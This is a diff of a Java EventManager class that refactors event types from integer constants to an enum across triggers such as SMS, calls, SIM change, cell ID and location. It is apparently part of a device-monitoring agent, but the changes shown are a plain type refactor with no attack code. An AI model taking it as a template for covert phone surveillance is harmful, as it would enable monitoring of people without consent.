@@ -53,7 +53,7 @@ public class EventManager extends Manager {
 	 *            : Agent ID
 	 * @return the requested agent or null in case of error
 	 */
-	private EventBase factory(final int type, final int id) {
+	private EventBase factory(final EventType type, final int id) {
 		EventBase e = null;
 
 		if (running.containsKey(id) == true) {
@@ -61,56 +61,56 @@ public class EventManager extends Manager {
 		}
 
 		switch (type) {
-		case EventConf.EVENT_TIMER:
+		case EVENT_TIMER:
 			Log.d("QZ", TAG + " Info: " + "");
 			e = new TimerEvent();
 			break;
 
-		case EventConf.EVENT_SMS:
+		case EVENT_SMS:
 			Log.d("QZ", TAG + " Info: " + "EVENT_SMS");
 			break;
 
-		case EventConf.EVENT_CALL:
+		case EVENT_CALL:
 			Log.d("QZ", TAG + " Info: " + "EVENT_CALL");
 			break;
 
-		case EventConf.EVENT_CONNECTION:
+		case EVENT_CONNECTION:
 			Log.d("QZ", TAG + " Info: " + "EVENT_CONNECTION");
 			break;
 
-		case EventConf.EVENT_PROCESS:
+		case EVENT_PROCESS:
 			Log.d("QZ", TAG + " Info: " + "EVENT_PROCESS");
 			break;
 
-		case EventConf.EVENT_CELLID:
+		case EVENT_CELLID:
 			Log.d("QZ", TAG + " Info: " + "EVENT_CELLID");
 			e = new CellIdEvent();
 			break;
 
-		case EventConf.EVENT_QUOTA:
+		case EVENT_QUOTA:
 			Log.d("QZ", TAG + " Info: " + "EVENT_QUOTA");
 			break;
 
-		case EventConf.EVENT_SIM_CHANGE:
+		case EVENT_SIM_CHANGE:
 			Log.d("QZ", TAG + " Info: " + "EVENT_SIM_CHANGE");
 			break;
 
-		case EventConf.EVENT_LOCATION:
+		case EVENT_LOCATION:
 			Log.d("QZ", TAG + " Info: " + "EVENT_LOCATION");
 			e = new LocationEvent();
 			break;
 
-		case EventConf.EVENT_AC:
+		case EVENT_AC:
 			Log.d("QZ", TAG + " Info: " + "EVENT_AC");
 			e = new AcEvent();
 			break;
 
-		case EventConf.EVENT_BATTERY:
+		case EVENT_BATTERY:
 			Log.d("QZ", TAG + " Info: " + "EVENT_BATTERY");
 			e = new BatteryEvent();
 			break;
 
-		case EventConf.EVENT_STANDBY:
+		case EVENT_STANDBY:
 			Log.d("QZ", TAG + " Info: " + "EVENT_STANDBY");
 			e = new StandbyEvent();
 			break;
@@ -153,7 +153,7 @@ public class EventManager extends Manager {
 			final Map.Entry<Integer, EventConf> pairs = it.next();
 			
 			final EventConf conf = pairs.getValue();
-			final int type = conf.getType();
+			final EventType type = conf.getType();
 			Check.asserts(pairs.getKey() == conf.getId(), "wrong mapping");
 			
 			final EventBase e = factory(type, conf.getId());
